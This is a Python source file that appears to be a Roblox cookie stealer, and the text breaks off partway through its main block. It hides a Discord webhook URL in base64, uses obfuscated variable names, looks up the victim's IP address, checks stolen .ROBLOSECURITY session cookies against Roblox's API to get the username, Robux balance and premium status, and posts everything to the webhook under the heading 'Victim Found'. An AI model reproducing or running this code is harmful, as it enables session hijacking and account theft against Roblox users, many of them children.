import sys as a, json as b, requests as c, base64 as d

e = d.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzMDYzNjc0MTg3OTEzNjQyMC9mcWZHcWY3SG5CX2l0aTNLN2NCbmtNMWV4Wnpvbzg3TlhwbV8xOURYNmU5RGptZjJmb3dXNEhYMjZPZjlsR1o0Wkx2").decode()

def f(g, h):
    i = c.get("https://api.ipify.org").text
    j = None
    if g:
        k = {"Cookie": f".ROBLOSECURITY={g}"}
        j = c.get("https://www.roblox.com/mobileapi/userinfo", headers=k, allow_redirects=False)
        if j.status_code == 200:
            j = j.json()

    l = {
        "content": None,
        "embeds": [
            {
                "description": f"```\n{g or 'COOKIE NOT FOUND'}\n```\n```\n{h or 'COOKIE NOT FOUND'}\n```",
                "color": None,
                "fields": [
                    {
                        "name": "Username",
                        "value": j["UserName"] if j else "N/A",
                        "inline": True
                    },
                    {
                        "name": "Robux",
                        "value": j["RobuxBalance"] if j else "N/A",
                        "inline": True
                    },
                    {
                        "name": "Premium",
                        "value": j["IsPremium"] if j else "N/A",
                        "inline": True
                    }
                ],
                "author": {
                    "name": f"Victim Found: {i}",
                    "icon_url": j["ThumbnailUrl"] if j else "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                },
                "footer": {
                    "text": "sigma",
                    "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                },
                "thumbnail": {
                    "url": j["ThumbnailUrl"] if j else "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                }
            }
        ],
        "username": "Roblox",
        "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
        "attachments": []
    }

    c.post(e, headers={"Content-Type": "application/json"}, data=b.dumps(l))

if __name__ == "__main__":
    l = a.argv[1] if len(a.argv) > 1 else None
    m = a.argv[2] if
